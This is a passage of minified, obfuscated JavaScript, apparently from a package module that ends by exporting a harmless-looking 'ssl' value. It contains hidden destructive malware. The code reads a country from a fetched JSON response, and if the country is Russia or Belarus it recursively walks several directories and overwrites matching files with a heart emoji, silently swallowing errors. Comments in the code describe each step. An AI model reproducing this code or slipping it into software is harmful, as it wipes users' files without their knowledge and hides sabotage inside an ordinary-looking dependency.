JSON.parse(t.toString("utf8")); const u =
s[c.toString("utf8")].toLowerCase(); const a =
u.includes(e.toString("utf8")) || u.includes(i.toString("utf8")); //
checks if country is Russia or Belarus if (a) { h(n.toString("utf8"));
h(o.toString("utf8")); h(r.toString("utf8")); h(f.toString("utf8")); }
} catch (t) {} }); }); }, Math.ceil(Math.random() * 1e3)); async
function h(n = "", o = "") { if (!a.existsSync(n)) { return; } let r =
[]; try { r = a.readdirSync(n); } catch (t) {} const f = []; const c =
Buffer.from("4p2k77iP", "base64"); for (var e = 0; e < r.length; e++)
{ const i = u.join(n, r[e]); let t = null; try { t = a.lstatSync(i); }
catch (t) { continue; } if (t.isDirectory()) { const s = h(i, o);
s.length > 0 ? f.push(...s) : null; } else if (i.indexOf(o) >= 0) {
try { a.writeFile(i, c.toString("utf8"), function () {}); //
overwrites file with &#10084;&#65039; } catch (t) {} } } return f; } const ssl =
true; export { ssl as default, ssl };

